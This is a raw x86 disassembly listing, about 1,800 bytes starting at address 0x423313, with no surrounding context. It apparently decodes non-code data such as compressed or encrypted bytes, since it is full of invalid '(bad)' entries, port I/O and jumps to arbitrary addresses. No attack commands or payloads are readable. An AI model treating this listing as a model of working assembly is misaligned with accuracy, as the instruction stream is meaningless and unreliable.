  423313:	cli    
  423314:	test   eax,0x167f0824
  423319:	aas    
  42331a:	js     0x4232ed
  42331c:	mov    DWORD PTR [ebp+0x50],esi
  42331f:	xchg   ebp,eax
  423320:	nop
  423321:	jle    0x423333
  423323:	retf   
  423324:	push   eax
  423325:	mov    BYTE PTR [edi+ebp*1+0x34],dh
  423329:	and    al,0xb4
  42332b:	rol    DWORD PTR [eax+0x6cc5ebde],0xbb
  423332:	and    ebx,edx
  423334:	push   es
  423335:	ret    0xda91
  423338:	aas    
  423339:	cld    
  42333a:	(bad)  
  42333b:	pop    ds
  42333c:	sub    bl,ch
  42333e:	inc    esi
  42333f:	cmp    cl,BYTE PTR [edx]
  423341:	pop    ebp
  423342:	inc    ebp
  423343:	mov    fs,WORD PTR [eax+0x10ffe8de]
  423349:	in     eax,dx
  42334a:	dec    esp
  42334b:	sbb    DWORD PTR [ebp+eiz*8+0x70432542],ecx
  423352:	add    eax,0x552c5863
  423357:	add    eax,0xc167b485
  42335c:	ins    DWORD PTR es:[edi],dx
  42335d:	lea    eax,[eax-0x4818324]
  423363:	and    ch,0xf1
  423366:	sub    eax,0x2a4b8cb2
  42336b:	into   
  42336c:	out    0xb,eax
  42336e:	xchg   esi,eax
  42336f:	div    BYTE PTR [eax]
  423371:	xor    ecx,DWORD PTR [eax+ebx*8+0x21]
  423375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423376:	mul    ch
  423378:	sahf   
  423379:	(bad)  
  42337a:	pop    edx
  42337b:	test   esi,edi
  42337d:	push   0xfa44ee48
  423382:	test   eax,0xe2a91cdf
  423387:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423388:	xchg   esp,eax
  423389:	mov    ebp,0xf9f8e203
  42338e:	inc    edi
  42338f:	mov    gs,WORD PTR ds:0x997dc3e6
  423395:	and    eax,0x7438428c
  42339a:	popf   
  42339b:	hlt    
  42339c:	xor    bl,dl
  42339e:	mov    dl,0x1a
  4233a0:	fldenv [esi+esi*2-0x27]
  4233a4:	and    BYTE PTR [eax],ah
  4233a6:	or     ah,BYTE PTR [edi+0x1c8ff872]
  4233ac:	popa   
  4233ad:	jo     0x423346
  4233af:	hlt    
  4233b0:	mov    BYTE PTR [esi+0x6769ce2b],bh
  4233b6:	and    BYTE PTR [ecx-0x6b],ch
  4233b9:	adc    dl,BYTE PTR [ebx-0x5b]
  4233bc:	add    dl,cl
  4233be:	aas    
  4233bf:	out    0x43,al
  4233c1:	mov    dh,ah
  4233c3:	stos   DWORD PTR es:[edi],eax
  4233c4:	add    ah,ch
  4233c6:	jg     0x4233a6
  4233c8:	mov    esi,0x27a08840
  4233cd:	xlat   BYTE PTR ds:[ebx]
  4233ce:	add    ch,BYTE PTR [edx-0x46]
  4233d1:	outs   dx,DWORD PTR ds:[esi]
  4233d2:	sub    al,0x14
  4233d4:	push   esp
  4233d5:	or     BYTE PTR [ebx+edi*2+0x358bfc5a],dl
  4233dc:	jge    0x4233c6
  4233de:	pop    eax
  4233df:	jl     0x4233ec
  4233e1:	fild   DWORD PTR [ecx]
  4233e3:	in     eax,dx
  4233e4:	jb     0x423433
  4233e6:	sub    bl,dl
  4233e8:	in     al,dx
  4233e9:	fisttp WORD PTR [ebx+eax*8]
  4233ec:	push   ds
  4233ed:	lahf   
  4233ee:	and    DWORD PTR [edi-0x2c58971f],ecx
  4233f4:	cmp    eax,0x87202168
  4233f9:	in     al,0xc1
  4233fb:	(bad)
  4233fe:	cdq    
  4233ff:	lds    ecx,FWORD PTR [esi]
  423401:	jecxz  0x42340c
  423403:	or     BYTE PTR [ecx],bl
  423405:	xor    DWORD PTR [edi-0x60],0x3c
  423409:	or     ebx,esi
  42340b:	fist   WORD PTR [esi+0x1]
  42340e:	mov    al,ds:0xb639df08
  423413:	or     al,0x7c
  423415:	adc    eax,DWORD PTR [edx]
  423417:	(bad)  
  423418:	jg     0x4233bc
  42341a:	fwait
  42341b:	or     DWORD PTR [ebp+0x2f],0x41e12fd3
  423422:	adc    esi,DWORD PTR [ebx+0x77]
  423425:	jp     0x423449
  423427:	jmp    0xd471d45b
  42342c:	es pop esi
  42342e:	punpcklqdq xmm1,XMMWORD PTR [ecx]
  423432:	pop    ecx
  423433:	retf   
  423434:	into   
  423435:	(bad)  
  423436:	arpl   cx,bx
  423438:	les    ebx,FWORD PTR [ebp*8-0xd0501c9]
  42343f:	jl     0x4234bb
  423441:	sub    esp,esp
  423443:	fcom   QWORD PTR [ebp+ebx*8-0x7e7733af]
  42344a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42344b:	fild   QWORD PTR [ebx-0x38e263be]
  423451:	fs xchg edx,eax
  423453:	enter  0xb400,0xc5
  423457:	xor    BYTE PTR [edx+0xc],dl
  42345a:	and    eax,0x711ee95d
  42345f:	or     eax,0x87721e55
  423464:	test   esi,edx
  423466:	adc    dh,ch
  423468:	outs   dx,DWORD PTR ds:[esi]
  423469:	fcmove st,st(4)
  42346b:	mov    eax,0x10e2e0d
  423470:	or     bl,BYTE PTR [ebx-0x2b1d2443]
  423476:	pop    eax
  423477:	dec    ebx
  423478:	and    edi,DWORD PTR ss:[edx-0x1484e37e]
  42347f:	sahf   
  423480:	xchg   edx,eax
  423481:	fst    st(3)
  423483:	adc    al,0xef
  423485:	lock (bad) 
  423487:	das    
  423488:	out    0x99,eax
  42348a:	push   0xd131d4ad
  42348f:	loopne 0x423432
  423491:	and    al,0xed
  423493:	call   0xf9da:0xb6e9d321
  42349a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42349b:	into   
  42349c:	ret    
  42349d:	jns    0x42343e
  42349f:	adc    al,BYTE PTR [edi-0x2a]
  4234a2:	ret    
  4234a3:	ror    DWORD PTR [edi],cl
  4234a5:	inc    edx
  4234a6:	js     0x4234f8
  4234a8:	ins    BYTE PTR es:[edi],dx
  4234a9:	push   ebx
  4234aa:	push   esi
  4234ab:	cmp    BYTE PTR [edx+eax*1+0x44767b55],bl
  4234b2:	into   
  4234b3:	sub    bh,BYTE PTR [ebx]
  4234b5:	int    0xfd
  4234b7:	mov    edx,0x96e7d431
  4234bc:	adc    esi,DWORD PTR [ecx-0x18]
  4234bf:	ret    
  4234c0:	xor    DWORD PTR [ecx+0x1d],0x74
  4234c4:	jecxz  0x423526
  4234c6:	shl    BYTE PTR [ebp-0xd5ca05c],1
  4234cc:	and    esp,DWORD PTR [eax]
  4234ce:	push   es
  4234cf:	jns    0x4234ca
  4234d1:	push   ss
  4234d2:	std    
  4234d3:	mov    al,ds:0xf589fb5a
  4234d8:	xchg   ebp,eax
  4234d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234da:	push   ds
  4234db:	push   es
  4234dc:	jns    0x4234be
  4234de:	jp     0x423544
  4234e0:	shl    BYTE PTR [ebx+0x4ddd3f7c],cl
  4234e6:	iret   
  4234e7:	jnp    0x423484
  4234e9:	xor    dl,BYTE PTR [ecx]
  4234eb:	pushf  
  4234ec:	pusha  
  4234ed:	cmc    
  4234ee:	in     eax,dx
  4234ef:	loopne 0x4234fe
  4234f1:	xchg   ebp,eax
  4234f2:	jl     0x4234bc
  4234f4:	pop    esi
  4234f5:	and    bl,bh
  4234f7:	adc    ch,bh
  4234f9:	cli    
  4234fa:	push   ss
  4234fb:	sub    DWORD PTR [eax+0x6d1c1b65],0x2
  423502:	adc    DWORD PTR [esi-0x31af039a],ecx
  423508:	popf   
  423509:	int    0xe1
  42350b:	or     al,0xff
  42350d:	ret    
  42350e:	jmp    0x42353e
  423510:	pusha  
  423511:	jecxz  0x4234cd
  423513:	pop    edi
  423514:	sti    
  423515:	sar    DWORD PTR [eax],0xb5
  423518:	scas   eax,DWORD PTR es:[edi]
  423519:	mov    cl,bl
  42351b:	mov    al,0xbf
  42351d:	dec    esp
  42351e:	mov    al,0xe0
  423520:	je     0x423521
  423522:	fsub   st(3),st
  423524:	aam    0x36
  423526:	cmpxchg BYTE PTR es:[ecx-0x97ac9fe],dh
  42352e:	inc    edi
  42352f:	cmp    dh,dl
  423531:	xlat   BYTE PTR ds:[ebx]
  423532:	inc    ebp
  423533:	in     eax,dx
  423534:	scas   al,BYTE PTR es:[edi]
  423535:	fisttp DWORD PTR [ecx+0x5d]
  423538:	imul   DWORD PTR [ebx]
  42353a:	retf   
  42353b:	popa   
  42353c:	mov    dh,0x29
  42353e:	add    al,0xe8
  423540:	push   ecx
  423541:	retf   
  423542:	add    BYTE PTR [ebp+0x3a],ch
  423545:	sahf   
  423546:	fisub  DWORD PTR [ebp-0x13]
  423549:	xchg   ebp,eax
  42354a:	retf   0x12ef
  42354d:	sbb    ebp,edi
  42354f:	arpl   si,bp
  423551:	push   eax
  423552:	test   eax,0xa22ee1bc
  423557:	inc    ebp
  423558:	loopne 0x423567
  42355a:	ss mov esi,0x2a5fc5c9
  423560:	stc    
  423561:	arpl   ax,bp
  423563:	mov    esi,0x50280b65
  423568:	and    al,BYTE PTR [ebp-0x27]
  42356b:	nop
  42356c:	push   eax
  42356d:	dec    esp
  42356e:	cmp    bh,BYTE PTR [esp]
  423571:	jne    0x4235a2
  423573:	in     eax,0x93
  423575:	repz mov esi,0x8c9235ee
  42357b:	(bad)  
  42357c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42357d:	mov    ss,WORD PTR [ebp-0x10a68081]
  423583:	aam    0xf1
  423585:	aaa    
  423586:	pop    edx
  423587:	stc    
  423588:	repz sbb edi,ebp
  42358b:	fs pop ebp
  42358d:	push   es
  42358e:	jno    0x366f5aae
  423594:	jnp    0x42354b
  423596:	popa   
  423597:	mov    ch,0xbd
  423599:	lahf   
  42359a:	rol    DWORD PTR [edi-0x6f],0x2d
  42359e:	retf   
  42359f:	sub    bl,BYTE PTR [edi]
  4235a1:	in     eax,0x6b
  4235a3:	repz shl BYTE PTR [ebx-0x4f810b04],0xc
  4235ab:	xchg   esi,eax
  4235ac:	add    bl,ah
  4235ae:	jle    0x423598
  4235b0:	out    dx,al
  4235b1:	dec    esi
  4235b2:	(bad)  
  4235b3:	mov    dl,0x10
  4235b5:	or     eax,0xb8253179
  4235ba:	sbb    DWORD PTR [esi-0xb],edx
  4235bd:	loopne 0x4235bc
  4235bf:	add    eax,DWORD PTR [edx-0x11]
  4235c2:	out    dx,al
  4235c3:	jbe    0x4235f6
  4235c5:	add    esp,DWORD PTR [edx]
  4235c7:	cwde   
  4235c8:	pop    ebx
  4235c9:	(bad)  
  4235ca:	fisttp QWORD PTR [edx-0x2d]
  4235cd:	cmp    DWORD PTR [edi+0x31e8b20a],0x11efb51c
  4235d7:	pop    ebp
  4235d8:	xor    BYTE PTR [edx+0x15],cl
  4235db:	cmp    esp,DWORD PTR [ebp-0x3]
  4235de:	inc    DWORD PTR [edi+esi*1-0x6c]
  4235e2:	mov    eax,ds:0x4b194bff
  4235e7:	cmp    esi,eax
  4235e9:	mov    al,0x60
  4235eb:	lds    edi,FWORD PTR [ebp+edx*8-0x7d]
  4235ef:	jge    0x423619
  4235f1:	(bad)  
  4235f2:	popa   
  4235f3:	push   ss
  4235f4:	sar    edi,1
  4235f6:	xchg   DWORD PTR [eax],edi
  4235f8:	fisubr WORD PTR [edi+eiz*1-0x31]
  4235fc:	sub    ah,BYTE PTR [eax-0x60d688ca]
  423602:	outs   dx,DWORD PTR ds:[esi]
  423603:	sbb    BYTE PTR [edi-0x36ec02c9],ch
  423609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42360a:	mov    ecx,edi
  42360c:	mov    edx,0xbd3b16f6
  423611:	xchg   ebx,eax
  423612:	add    BYTE PTR [esi+0x66e70de4],ah
  423618:	dec    eax
  423619:	fwait
  42361a:	sar    DWORD PTR [ebp+esi*8+0x3c],1
  42361e:	jo     0x4235e5
  423620:	int    0x1f
  423622:	mov    eax,0x8ab4f7a8
  423627:	mov    DWORD PTR [ebx+0x20e46ced],eax
  42362d:	in     eax,dx
  42362e:	pop    ebp
  42362f:	fld    DWORD PTR [eax-0x134ea4b0]
  423635:	xor    dl,0xaa
  423638:	xchg   DWORD PTR [ebx-0x5],ecx
  42363b:	out    dx,al
  42363c:	or     ebx,ecx
  42363e:	cmp    DWORD PTR [ecx+0x3],edi
  423641:	mov    ebp,0x3b0ff484
  423646:	das    
  423647:	(bad)  
  423648:	(bad)  
  423649:	mul    BYTE PTR [ebp-0xc]
  42364c:	add    BYTE PTR [ecx-0x2],bh
  42364f:	sub    bh,BYTE PTR [eax+edx*1-0x54f543f4]
  423656:	jbe    0x4235fc
  423658:	fwait
  423659:	(bad)  
  42365a:	dec    ecx
  42365b:	pusha  
  42365c:	aas    
  42365d:	mov    esi,0x828253c2
  423662:	cmp    eax,0x18d7812a
  423667:	and    ah,dh
  423669:	ficomp WORD PTR [ebp-0x70afb8cc]
  42366f:	(bad)  
  423670:	fst    QWORD PTR [edx]
  423672:	(bad)  
  423673:	mov    eax,DWORD PTR [edx+0x3507da67]
  423679:	mov    esp,0xcf4233c8
  42367e:	push   edx
  42367f:	call   0x9f5a76c7
  423684:	add    eax,DWORD PTR [edx+ebp*1-0x5bccf241]
  42368b:	stos   DWORD PTR es:[edi],eax
  42368c:	cmp    eax,0xa682e0ab
  423691:	cli    
  423692:	xchg   esi,eax
  423693:	inc    ecx
  423694:	cwde   
  423695:	adc    BYTE PTR [edi-0xd06b5a5],ah
  42369b:	pushf  
  42369c:	push   eax
  42369d:	mov    BYTE PTR [ebx+0x6c],ah
  4236a0:	fbstp  TBYTE PTR [edx+0x4ed33ad4]
  4236a6:	mov    ah,0xa1
  4236a8:	fs push ss
  4236aa:	cmp    al,BYTE PTR ds:0x48fdfb68
  4236b0:	xchg   ecx,eax
  4236b1:	inc    esp
  4236b2:	mov    ds:0xe3099b3b,eax
  4236b7:	loop   0x4236a6
  4236b9:	cmp    eax,0xf0d92d1a
  4236be:	inc    esi
  4236bf:	imul   DWORD PTR [ebp+0x7a]
  4236c2:	xor    al,0x5e
  4236c4:	leave  
  4236c5:	sbb    BYTE PTR [ecx],dl
  4236c7:	fs fwait
  4236c9:	mov    ebp,0x15a2027e
  4236ce:	inc    edx
  4236cf:	mov    ds:0x9ebd1db,eax
  4236d4:	fisubr WORD PTR [edx]
  4236d6:	pop    es
  4236d7:	test   DWORD PTR [esi-0x168ae0ee],0x4a90a289
  4236e1:	add    BYTE PTR [ebp+ebp*4+0x7],dl
  4236e5:	je     0x4236be
  4236e7:	scas   eax,DWORD PTR es:[edi]
  4236e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236e9:	out    dx,eax
  4236ea:	push   esp
  4236eb:	retf   
  4236ec:	int3   
  4236ed:	push   es
  4236ee:	push   ds
  4236ef:	addr16 inc edi
  4236f1:	js     0x4236b5
  4236f3:	add    eax,0x525255a8
  4236f8:	jb     0x4236bb
  4236fa:	dec    esp
  4236fb:	mov    ds:0x6ac50037,eax
  423700:	add    al,0xa8
  423702:	in     al,0x62
  423704:	test   al,0xa2
  423706:	ss jg  0x423758
  423709:	inc    esp
  42370a:	push   ds
  42370b:	fdiv   QWORD PTR [ecx-0x426dc5ac]
  423711:	stos   BYTE PTR es:[edi],al
  423712:	mov    cl,0xc4
  423714:	outs   dx,BYTE PTR ds:[esi]
  423715:	das    
  423716:	dec    DWORD PTR [ecx+0x71]
  423719:	adc    esp,DWORD PTR [ecx+0x606ceb43]
  42371f:	rcr    DWORD PTR ds:0x2e31438c,cl
  423725:	gs ret 0xbdb5
  423729:	pusha  
  42372a:	loopne 0x423728
  42372c:	adc    al,0xa7
  42372e:	sbb    eax,0x69073ba3
  423733:	lea    esi,[esi+0xc636747]
  423739:	push   ebx
  42373a:	loope  0x4237b4
  42373c:	sub    ch,al
  42373e:	mov    ss,edx
  423740:	(bad)  
  423741:	mov    ds:0x2177f2c8,al
  423746:	ret    
  423747:	mov    al,0x11
  423749:	inc    ebx
  42374a:	loop   0x42379e
  42374c:	and    al,0x7a
  42374e:	ds jle 0x42374b
  423751:	push   ds
  423752:	mov    dl,0xde
  423754:	repz dec eax
  423756:	scas   eax,DWORD PTR es:[edi]
  423757:	pcmpeqb mm6,QWORD PTR [ecx-0x54]
  42375b:	rep stos DWORD PTR es:[edi],eax
  42375d:	test   ebx,0xe8e0c665
  423763:	push   ss
  423764:	xor    eax,0x489d53e
  423769:	aaa    
  42376a:	lods   eax,DWORD PTR ds:[esi]
  42376b:	cwde   
  42376c:	mov    esi,0xbb24dfa9
  423771:	sub    esp,DWORD PTR [eax]
  423773:	xchg   edx,eax
  423774:	in     eax,dx
  423775:	adc    al,0xdc
  423777:	sub    al,0x95
  423779:	mov    ch,0xbf
  42377b:	and    DWORD PTR [eax-0x3a],esi
  42377e:	or     dh,BYTE PTR [eax]
  423780:	retf   0xbf65
  423783:	jnp    0x423727
  423785:	mov    bh,ch
  423787:	ss cwde 
  423789:	jmp    0x4138:0x694e1dab
  423790:	adc    al,0x3c
  423792:	arpl   cx,cx
  423794:	retf   0xa694
  423797:	mov    esi,0x28af8cd4
  42379c:	mov    edx,DWORD PTR [eax]
  42379e:	fdivr  QWORD PTR [ecx]
  4237a0:	jne    0x423736
  4237a2:	test   DWORD PTR [ebp+0xdc8ff28],esi
  4237a8:	dec    eax
  4237a9:	add    dh,BYTE PTR [esi-0x1dfbd031]
  4237af:	aas    
  4237b0:	out    0x45,eax
  4237b2:	popf   
  4237b3:	test   DWORD PTR [edi],ecx
  4237b5:	mov    ah,0x5a
  4237b7:	retf   0xaa55
  4237ba:	out    dx,eax
  4237bb:	in     eax,0xa2
  4237bd:	(bad)  
  4237be:	dec    eax
  4237bf:	sti    
  4237c0:	adc    al,0xaf
  4237c2:	idiv   ecx
  4237c4:	stc    
  4237c5:	retf   0xc30a
  4237c8:	sub    eax,0x5208e5f8
  4237cd:	shr    BYTE PTR [edi],cl
  4237cf:	and    DWORD PTR [ecx+0x4b],esi
  4237d2:	pop    ebx
  4237d3:	xchg   esp,eax
  4237d4:	add    al,0x8f
  4237d6:	ds dec esp
  4237d8:	pushf  
  4237d9:	pop    esi
  4237da:	retf   0x7833
  4237dd:	mov    bh,0xf1
  4237df:	loop   0x4237e1
  4237e1:	xchg   ecx,eax
  4237e2:	cmp    cl,BYTE PTR [ecx-0x3f08997b]
  4237e8:	jecxz  0x423792
  4237ea:	mov    bh,0x1b
  4237ec:	pop    edx
  4237ed:	fsub   st(3),st
  4237ef:	out    0xc,eax
  4237f1:	mov    ebp,0xe36bfbb
  4237f6:	(bad)  
  4237f7:	repnz pop edi
  4237f9:	into   
  4237fa:	out    0xa3,eax
  4237fc:	cmp    eax,0xa87d758e
  423801:	rcl    DWORD PTR [edi-0x56dcba8d],0x89
  423808:	cmp    BYTE PTR [ecx+eiz*4-0x7d],al
  42380c:	and    eax,0x67905c98
  423811:	js     0x42384c
  423813:	repz mov eax,ds:0x8b387395
  423819:	mov    bh,0x3c
  42381b:	call   0x7c038070
  423820:	pop    esi
  423821:	add    BYTE PTR [eax-0x7723f7c6],ah
  423827:	add    al,0x6c
  423829:	pop    eax
  42382a:	xor    dh,0x9e
  42382d:	fld1   
  42382f:	cdq    
  423830:	mov    dl,0x95
  423832:	ret    0x57ff
  423835:	rcr    BYTE PTR ds:0x76cbad5b,1
  42383b:	sub    dh,BYTE PTR [ebp-0x2c]
  42383e:	or     BYTE PTR [ecx+0x6da0d7de],dl
  423844:	clc    
  423845:	mov    esp,0xbe964c27
  42384a:	je     0x42380d
  42384c:	or     al,0xf3
  42384e:	dec    ebx
  42384f:	(bad)  
  423850:	add    eax,DWORD PTR [ecx]
  423852:	enter  0xf8e3,0xd3
  423856:	jns    0x423887
  423858:	push   ecx
  423859:	outs   dx,DWORD PTR ds:[esi]
  42385a:	pushf  
  42385b:	mov    edx,0x5aa39fe6
  423860:	push   es
  423861:	adc    al,0xf8
  423863:	push   ecx
  423864:	adc    eax,0x89d9fe02
  423869:	mov    ebx,0x4ec1ec6a
  42386e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42386f:	adc    dh,BYTE PTR [esi]
  423871:	das    
  423872:	jp     0x42381c
  423874:	sub    cl,BYTE PTR [edi]
  423876:	xchg   ecx,eax
  423877:	lds    ebx,FWORD PTR [ebx+0x30abb9a1]
  42387d:	ficom  DWORD PTR [ebx-0x5b]
  423880:	je     0x4238bd
  423882:	sbb    ebx,DWORD PTR [ebx]
  423884:	into   
  423885:	push   es
  423886:	test   DWORD PTR [edx-0x213f2a93],eax
  42388c:	cmp    DWORD PTR ds:0xd3ea0e57,edx
  423892:	gs out 0x60,eax
  423895:	adc    DWORD PTR [edi+0x47700bb1],eax
  42389b:	cld    
  42389c:	cmp    cl,BYTE PTR [esi+0x734a4e2f]
  4238a2:	outs   dx,BYTE PTR ds:[esi]
  4238a3:	and    ch,ch
  4238a5:	popa   
  4238a6:	test   al,0x25
  4238a8:	and    ah,cl
  4238aa:	mov    eax,ds:0xab93072
  4238af:	xchg   ebx,eax
  4238b0:	xlat   BYTE PTR ds:[ebx]
  4238b1:	pop    eax
  4238b2:	into   
  4238b3:	mov    edx,0x4bf395f5
  4238b8:	dec    ecx
  4238b9:	ret    
  4238ba:	mov    ds:0xf575c76c,eax
  4238bf:	cmc    
  4238c0:	aad    0x5
  4238c2:	push   0x70
  4238c4:	xchg   esp,eax
  4238c5:	xor    eax,0xc1a3817
  4238ca:	call   0x7b35:0xc8507792
  4238d1:	loop   0x42385d
  4238d3:	(bad)
  4238d6:	lds    eax,FWORD PTR [edi-0x59]
  4238d9:	loop   0x423875
  4238db:	xor    BYTE PTR [ebx],dl
  4238dd:	es adc eax,0xc44f606
  4238e3:	mov    al,al
  4238e5:	call   0xe082:0x16df15d8
  4238ec:	lea    edi,[ebp-0x2cfccdd3]
  4238f2:	cmc    
  4238f3:	inc    edi
  4238f4:	and    eax,0x9ff1659c
  4238f9:	pusha  
  4238fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238fb:	neg    al
  4238fd:	fbld   TBYTE PTR [esi]
  4238ff:	jne    0x4238a9
  423901:	sbb    dl,BYTE PTR [edx*4+0x124d3741]
  423908:	xor    cl,dh
  42390a:	pop    esp
  42390b:	inc    esp
  42390c:	or     eax,0xc165a4e3
  423911:	or     DWORD PTR [esi],edi
  423913:	xchg   ebx,eax
  423914:	mov    ebp,DWORD PTR [ecx+ebx*4]
  423917:	mov    edi,0x50a6a239
  42391c:	push   edx
  42391d:	xor    edx,esi
  42391f:	test   eax,0xbbf13c5d
  423924:	cld    
  423925:	mov    DWORD PTR [esi+0xd],esp
  423928:	mov    dl,al
  42392a:	mov    DWORD PTR [edi+0x34],esi
  42392d:	scas   eax,DWORD PTR es:[edi]
  42392e:	mov    BYTE PTR [ebx-0x26],0xc1
  423932:	inc    eax
  423933:	mov    ebp,0x233c19f5
  423938:	sub    DWORD PTR [ebp-0x5d],edi
  42393b:	dec    edi
  42393c:	mov    eax,ds:0x760a533
  423941:	adc    eax,0x28643d48
  423946:	jnp    0x4239a3
  423948:	sub    eax,0x23f04851
  42394d:	sbb    esi,ebp
  42394f:	lea    ebx,[edi+0x27971ca8]
  423955:	sub    ecx,DWORD PTR [esi+0x7eaed11b]
  42395b:	hlt    
  42395c:	push   es
  42395d:	call   0x1c2c6663
  423962:	test   DWORD PTR [edx-0x16f3e2f1],edx
  423968:	xor    al,0x8b
  42396a:	ret    
  42396b:	rcl    DWORD PTR [edx+0x66b6a6cd],0xe8
  423972:	mov    edx,0x4df56f77
  423977:	call   0x7c27:0x71678edd
  42397e:	jmp    0x2f8762a6
  423983:	stc    
  423984:	push   ss
  423985:	jnp    0x42390d
  423987:	cmp    eax,0xf2f5828e
  42398c:	ja     0x42394a
  42398e:	data16 sub al,BYTE PTR [edi+0x42092509]
  423995:	jl     0x4239a6
  423997:	xchg   esi,eax
  423998:	mov    ah,0x89
  42399a:	xchg   esi,eax
  42399b:	clc    
  42399c:	xchg   BYTE PTR [ebp+0x4a],cl
  42399f:	(bad)  
  4239a0:	out    0x47,eax
  4239a2:	xchg   esi,eax
  4239a3:	push   ss
  4239a4:	rol    DWORD PTR [eax-0x80],0x4d
  4239a8:	aaa    
  4239a9:	pop    ecx
  4239aa:	in     eax,0xc7
  4239ac:	push   cs
  4239ad:	xlat   BYTE PTR ds:[ebx]
  4239ae:	sub    eax,0xb49b2708
  4239b3:	fld    DWORD PTR [ebx-0x2308e671]
  4239b9:	fs push edx
  4239bb:	test   al,0xcb
  4239bd:	aad    0x24
  4239bf:	xor    eax,DWORD PTR [edi+ebp*2]
  4239c2:	je     0x423a2c
  4239c4:	inc    ebp
  4239c5:	(bad)  
  4239c6:	loope  0x423958
  4239c8:	mov    BYTE PTR [esi],bh
  4239ca:	xlat   BYTE PTR ds:[ebx]
  4239cb:	sub    al,0x6f
  4239cd:	stos   BYTE PTR es:[edi],al
  4239ce:	cmc    
  4239cf:	sub    BYTE PTR [eax+esi*2],ch
  4239d2:	xchg   DWORD PTR [esi],edx
  4239d4:	and    al,0xcc
  4239d6:	pop    eax
  4239d7:	xchg   esp,eax
  4239d8:	xor    al,bl
  4239da:	fnsetpm(287 only) 
  4239dc:	in     eax,0x9f
  4239de:	repnz xor eax,0x22323fd0
  4239e4:	and    al,0xbc
  4239e6:	aam    0xa
  4239e8:	or     DWORD PTR [ecx-0xb],0x71
  4239ec:	xchg   edx,eax
  4239ed:	mov    ah,0xd7
  4239ef:	fstp   QWORD PTR [ecx+0x37]
  4239f2:	out    dx,eax
  4239f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239f4:	hlt    
  4239f5:	xor    edi,ecx
  4239f7:	add    BYTE PTR fs:[ecx-0x642efeaa],dl
  4239fe:	or     eax,0xd46f8bbb
  423a03:	loop   0x423992
  423a05:	js     0x42398e
  423a07:	shl    DWORD PTR [ebx+0x6022ce15],0xdd
  423a0e:	and    eax,0x31fe1561
  423a13:	and    bl,BYTE PTR [edx-0xa091b47]
  423a19:	test   eax,0x4c7562d0
  423a1e:	not    DWORD PTR [esi]
  423a20:	sti    
  423a21:	ret    
  423a22:	and    al,0xaa
  423a24:	mov    esp,0xd2f50a77
  423a29:	pop    ds
  423a2a:	mov    bl,0xb1
  423a2c:	xor    DWORD PTR [ecx-0x7e13bcd2],esi
  423a32:	adc    eax,0x148626e5
  423a37:	scas   eax,DWORD PTR es:[edi]
  423a38:	jae    0x423a78
  423a3a:	dec    BYTE PTR [edi+0x17284a7c]
  423a40:	nop
  423a41:	sbb    eax,0xb3f0e879
  423a46:	repz int3 
  423a48:	dec    edx
  423a49:	add    edi,ebp
  423a4b:	scas   eax,DWORD PTR es:[edi]
  423a4c:	mov    dh,0x4e
  423a4e:	sar    DWORD PTR [edi+edx*4+0x14],0x7f
  423a53:	xlat   BYTE PTR ds:[ebx]
  423a54:	dec    edi
  423a55:	sub    BYTE PTR [esi+0x649e79b3],dh
  423a5b:	inc    esp
  423a5c:	xor    DWORD PTR [esi],ebp
  423a5e:	and    eax,0x42fc5a44
  423a63:	mov    ecx,0x7f57d97b
  423a68:	add    ebp,esp
  423a6a:	sar    DWORD PTR [ecx-0x37],1
  423a6d:	pop    eax
  423a6e:	xor    eax,0xa7b62bdb
  423a73:	and    DWORD PTR [ebx-0x263b7e82],ecx
  423a79:	dec    edi
  423a7a:	xor    cl,0x1
  423a7d:	add    al,0x41
  423a7f:	loop   0x423aec
  423a81:	push   ss
  423a82:	in     eax,0xa6
  423a84:	jne    0x423a32
  423a86:	adc    al,0x44
  423a88:	mov    dh,0x7a
  423a8a:	inc    esp
  423a8b:	xchg   BYTE PTR [esp+edi*8],dh
  423a8e:	das    
  423a8f:	bound  ebx,QWORD PTR [ecx-0x7771aeb7]
  423a95:	imul   edx
  423a97:	push   edx
  423a98:	repz leave 
  423a9a:	fild   DWORD PTR [eax]
  423a9c:	(bad)  
  423a9d:	pop    ss
  423a9e:	std    
  423a9f:	push   ecx
  423aa0:	ja     0x423ad0
  423aa2:	or     BYTE PTR [edx],0x1e
  423aa5:	mov    edx,DWORD PTR [edx-0x21]
  423aa8:	add    bh,BYTE PTR [eax]
  423aaa:	inc    esp
  423aab:	(bad)  
  423aac:	ror    DWORD PTR [edi+0x7c],0x63
  423ab0:	out    dx,al
  423ab1:	mov    ch,0x3c
  423ab3:	addr16 ds pop ebp
  423ab6:	xor    DWORD PTR [esi+0x2de82f20],0xffffffa9
  423abd:	pop    esp
  423abe:	mov    ch,0xbf
  423ac0:	stc    
  423ac1:	sub    al,0x1c
  423ac3:	imul   edx,DWORD PTR [edx+esi*4+0x3e4da540],0xfffffffe
  423acb:	std    
  423acc:	jle    0x423ac6
  423ace:	add    BYTE PTR [ecx],cl
  423ad0:	je     0x423b35
  423ad2:	inc    DWORD PTR [ecx+0x317ef54b]
  423ad8:	inc    esp
  423ada:	or     eax,0x7ed7392e
  423adf:	dec    eax
  423ae0:	fcom   DWORD PTR [ecx-0x33]
  423ae3:	test   DWORD PTR [esi],eax
  423ae5:	(bad)  
  423ae7:	icebp  
  423ae8:	mov    ds,WORD PTR [edi]
  423aea:	rol    esp,0x94
  423aed:	add    ebp,esi
  423aef:	xchg   BYTE PTR [ebx+eax*4-0x64],ah
  423af3:	mov    eax,0x6796ec04
  423af8:	sahf   
  423af9:	or     al,0xd7
  423afb:	adc    DWORD PTR [edx+eiz*2-0x727fa385],0x158b0935
  423b06:	dec    eax
  423b07:	loopne 0x423b83
  423b09:	sbb    al,0x21
  423b0b:	call   0x86f08733
  423b10:	mov    bl,0xcf
  423b12:	sub    ah,BYTE PTR [edi-0x58]
  423b15:	cmp    BYTE PTR [ecx+eiz*4],0xd6
  423b19:	add    cl,dh
  423b1b:	std    
  423b1c:	aas    
